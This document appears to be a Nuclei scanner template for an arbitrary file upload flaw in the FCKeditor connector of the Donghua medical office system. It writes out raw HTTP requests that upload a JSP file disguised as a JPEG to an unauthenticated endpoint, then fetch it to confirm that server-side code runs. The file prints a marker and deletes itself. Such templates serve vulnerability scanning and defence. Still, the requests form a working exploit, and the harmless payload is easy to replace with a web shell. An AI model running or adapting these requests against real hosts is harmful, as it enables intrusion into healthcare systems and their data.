id: donghua-OA-FCKeditor-upload
info:
  name: donghua-OA-FCKeditor-upload
  author: apple
  severity: critical
  description: 东华医疗协同办公系统是专为医疗机构设计的一套综合性办公管理软件，旨在提升医疗机构内部协同工作效率。该系统集成了日常办公所需的各种功能模块，包括日程管理、会议管理、文件共享、任务分配等，实现了信息的集中管理和统一协作平台。
  reference:
    - https://blog.csdn.net/weixin_45530380/article/details/135337239
  tags: tags
http:
  - raw:
      - |
        POST /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/ HTTP/2
        Host: {{Hostname}}
        Cookie: JSESSIONID=17A17E4D9E4E38B72D650895AFF7D1DF
        Content-Length: 391
        Cache-Control: max-age=0
        Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "Windows"
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
        Origin: https://xx.xx.xx.xx
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

        ------WebKitFormBoundaryt1qdEWTI01cj5BLV
        Content-Disposition: form-data; name="NewFile"; filename="ceshiyixia.jsp"
        Content-Type: image/jpeg

        <%  out.println("test123");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        ------WebKitFormBoundaryt1qdEWTI01cj5BLV
        Content-Disposition: form-data; name="Submit"

        upload
        ------WebKitFormBoundaryt1qdEWTI01cj5BLV--
      - |-
        GET /common/FCKeditor/UserFiles/ceshiyixia.jsp HTTP/2
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: none
        Sec-Fetch-User: ?1
        Te: trailers
    matchers:
      - type: word
        part: body
        words:
          - 'test123'
